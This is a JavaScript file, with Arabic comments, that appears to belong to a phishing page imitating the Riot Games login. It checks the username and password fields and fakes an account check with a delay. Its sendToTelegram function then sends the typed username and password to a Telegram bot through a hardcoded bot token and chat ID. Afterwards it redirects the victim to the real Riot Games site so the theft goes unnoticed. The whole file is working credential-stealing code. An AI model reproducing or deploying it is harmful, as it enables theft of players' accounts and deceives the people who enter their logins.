function checkInputs() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    const loginBtn = document.getElementById("login-btn");

    if (username !== "" && password !== "") {
        loginBtn.removeAttribute("disabled");
    } else {
        loginBtn.setAttribute("disabled", "true");
    }
}

async function validateAndSend() {
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value.trim();
    const errorMessage = document.getElementById("error-message");

    if (!isValidUsername(username)) {
        errorMessage.textContent = "Invalid username format.";
        errorMessage.style.display = "block";
        return;
    }

    if (!isValidPassword(password)) {
        errorMessage.textContent = "Password must be at least 8 characters.";
        errorMessage.style.display = "block";
        return;
    }

    errorMessage.style.display = "none";

    // التحقق من الحساب عبر Riot Games (محاكاة)
    const isValid = await checkRiotAccount(username, password);
    if (!isValid) {
        errorMessage.textContent = "Incorrect username or password.";
        errorMessage.style.display = "block";
        return;
    }

    sendToTelegram(username, password);

    window.location.href = "https://www.riotgames.com/";
}

function isValidUsername(username) {
    const regex = /^[a-zA-Z0-9._-]{3,16}$/; // اسم مستخدم صالح وفقًا لمتطلبات Riot Games
    return regex.test(username);
}

function isValidPassword(password) {
    return password.length >= 8;
}

async function checkRiotAccount(username, password) {
    // محاكاة تحقق من Riot Games (لا يمكن فعل ذلك مباشرة)
    await new Promise(resolve => setTimeout(resolve, 1000)); // تأخير للتأثير الواقعي
    return username === "validUser" && password === "ValidPass123"; // محاكاة فقط
}

function sendToTelegram(username, password) {
    const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM";
    const chatId = "6687453395";
    const message = `🔥 تسجيل دخول جديد 🔥\n\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .catch(error => console.error("Error sending to Telegram:", error));
}
